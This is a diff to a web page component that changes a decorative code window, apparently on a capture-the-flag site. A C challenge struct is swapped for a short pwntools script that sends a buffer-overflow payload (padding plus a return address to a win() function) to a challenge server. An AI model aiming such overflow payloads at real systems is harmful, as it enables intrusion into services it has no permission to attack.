@@ -29,28 +29,25 @@ import { Card } from "@/components/ui/card";
                     <div class="w-3 h-3 rounded-full bg-[#ff5f56]"></div>
                     <div class="w-3 h-3 rounded-full bg-[#ffbd2e]"></div>
                     <div class="w-3 h-3 rounded-full bg-[#27c93f]"></div>
-                    <div class="ml-auto text-[10px] text-white/30 font-mono">exploit.c</div>
+                    <div class="ml-auto text-[10px] text-white/30 font-mono">solver.py</div>
                 </div>
                 
                 {/* Code Content */}
                 <div class="p-6 overflow-x-auto">
                     <pre class="font-mono text-sm leading-relaxed">
-<span class="text-[#569cd6]">#include</span> <span class="text-[#ce9178]">&lt;stdio.h&gt;</span>
-<span class="text-[#569cd6]">#include</span> <span class="text-[#ce9178]">&lt;stdlib.h&gt;</span>
-<span class="text-[#569cd6]">#include</span> <span class="text-[#ce9178]">&lt;string.h&gt;</span>
+<span class="text-[#c586c0]">import</span> <span class="text-[#9cdcfe]">socket</span>
+<span class="text-[#c586c0]">from</span> <span class="text-[#9cdcfe]">pwn</span> <span class="text-[#c586c0]">import</span> <span class="text-[#dcdcaa]">*</span>
 
-<span class="text-[#c586c0]">#define</span> <span class="text-[#4fc1ff]">FLAGSIZE_MAX</span> <span class="text-[#b5cea8]">64</span>
+<span class="text-[#6a9955]"># Connect to challenge</span>
+<span class="text-[#9cdcfe]">target</span> = <span class="text-[#dcdcaa]">remote</span>(<span class="text-[#ce9178]">'ctf.gooseberry.com'</span>, <span class="text-[#b5cea8]">1337</span>)
 
-<span class="text-[#6a9955]">// Create struct</span>
-<span class="text-[#569cd6]">typedef</span> <span class="text-[#569cd6]">struct</span> {'{'}
-  <span class="text-[#569cd6]">char</span> a[<span class="text-[#b5cea8]">10</span>];
-  <span class="text-[#569cd6]">char</span> b[<span class="text-[#b5cea8]">10</span>];
-  <span class="text-[#569cd6]">char</span> c[<span class="text-[#b5cea8]">10</span>];
-  <span class="text-[#569cd6]">char</span> flag[<span class="text-[#b5cea8]">5</span>];
-{'}'} <span class="text-[#9cdcfe]">object</span>;
+<span class="text-[#6a9955]"># Craft payload for buffer overflow</span>
+<span class="text-[#9cdcfe]">offset</span> = <span class="text-[#b5cea8]">64</span>
+<span class="text-[#9cdcfe]">payload</span> = <span class="text-[#ce9178]">b'A'</span> * <span class="text-[#9cdcfe]">offset</span>
+<span class="text-[#9cdcfe]">payload</span> += <span class="text-[#dcdcaa]">p64</span>(<span class="text-[#b5cea8]">0x401176</span>) <span class="text-[#6a9955]"># Ret to win() function</span>
 
-<span class="text-[#569cd6]">int</span> <span class="text-[#9cdcfe]">num_allocs</span>;
-<span class="text-[#9cdcfe]">object</span> *<span class="text-[#9cdcfe]">x</span>;</pre>
+<span class="text-[#9cdcfe]">target</span>.<span class="text-[#dcdcaa]">sendline</span>(<span class="text-[#9cdcfe]">payload</span>)
+<span class="text-[#9cdcfe]">target</span>.<span class="text-[#dcdcaa]">interactive</span>()</pre>
                 </div>
             </Card>
         </div>
